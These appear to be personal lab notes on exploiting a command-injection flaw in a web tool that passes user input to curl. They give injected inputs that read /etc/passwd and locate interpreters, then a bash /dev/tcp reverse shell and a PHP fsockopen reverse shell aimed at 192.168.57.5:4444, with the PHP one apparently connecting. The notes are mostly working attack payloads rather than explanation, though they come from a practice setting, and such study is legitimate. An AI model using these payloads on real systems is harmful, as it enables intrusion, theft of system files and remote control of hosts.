Command running is 
Command: curl -I -s -L | grep "HTTP/"


i/p:  
;cat /etc/passwd;asd
Command: curl -I -s -L ;cat /etc/passwd;asd | grep "HTTP/"

no i/p given to curl so it will thorw an error
print the /etc/passwd file data
pass random data to grep command

use ; to separate commands

Try to get a reverse shell when we have command injection

i/p
;which bash;asd

![[Pasted image 20230715151947.png]]

it is bash shell


i/p for reverse shell

; /bin/bash -i >& /dev/tcp/192.168.57.5/4444 0>&1;asd

this dosent work in this case

i/p:
;which php;asd

![[Pasted image 20230715152426.png]]

so its path is /usr/local/bin/php

i/p:

;which python3;asd

no result

try php payload

i/p
/usr/local/bin/php -r '$sock=fsockopen("192.168.57.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");';asd

dosent load immediately so probable connection established

![[Pasted image 20230715152949.png]]

